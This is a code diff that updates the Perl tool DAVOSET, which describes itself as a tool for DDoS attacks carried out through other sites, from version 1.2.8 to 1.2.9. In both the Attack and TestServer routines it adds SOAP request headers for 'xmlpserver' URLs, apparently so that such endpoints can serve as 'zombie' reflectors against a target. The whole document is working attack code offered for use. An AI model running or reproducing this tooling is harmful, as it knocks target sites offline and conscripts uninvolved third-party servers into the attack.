@@ -1,13 +1,13 @@
 #!/usr/bin/perl
 # DDoS attacks via other sites execution tool
-# DAVOSET v.1.2.8
+# DAVOSET v.1.2.9
 # Tool for conducting of DDoS attacks on the sites via other sites
 # Copyright (C) MustLive 2010-2016
-# Last update: 26.03.2016
+# Last update: 30.11.2016
 # http://websecurity.com.ua
 #############################################
 # Settings
-my $version = "1.2.8"; # program version
+my $version = "1.2.9"; # program version
 my $agent = "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1)"; # user agent
 my $default_port = "80"; # default port of the host
 my $show_stat = 1; # show statistic of work
@@ -235,10 +235,16 @@ sub Attack { # send request to zombie-server
 		}
 		print $sock "POST $page HTTP/1.1\n";
 		print $sock "Host: $host\n";
-		print $sock "User-Agent: $agent\n";
-		print $sock "Accept: */*\n";
+		if ($url =~ /xmlpserver/) {
+			print $sock "Content-Type: text/xml;charset=UTF-8\n";
+			print $sock "SOAPAction: \#replyToXML\n";
+		}
+		else {
+			print $sock "User-Agent: $agent\n";
+			print $sock "Accept: */*\n";
+			print $sock "Content-Type: application/x-www-form-urlencoded\n";
+		}
 		print $sock "Content-Length: ". length($params) ."\n";
-		print $sock "Content-Type: application/x-www-form-urlencoded\n";
 		print $sock "Connection: close\n\n";
 		print $sock "$params\r\n\r\n";
 	}
@@ -381,10 +387,16 @@ sub TestServer { # test zombie-server
 		}
 		print $sock "POST $page HTTP/1.1\n";
 		print $sock "Host: $host\n";
-		print $sock "User-Agent: $agent\n";
-		print $sock "Accept: */*\n";
+		if ($url =~ /xmlpserver/) {
+			print $sock "Content-Type: text/xml;charset=UTF-8\n";
+			print $sock "SOAPAction: \#replyToXML\n";
+		}
+		else {
+			print $sock "User-Agent: $agent\n";
+			print $sock "Accept: */*\n";
+			print $sock "Content-Type: application/x-www-form-urlencoded\n";
+		}
 		print $sock "Content-Length: ". length($params) ."\n";
-		print $sock "Content-Type: application/x-www-form-urlencoded\n";
 		print $sock "Connection: close\n\n";
 		print $sock "$params\r\n\r\n";
 	}
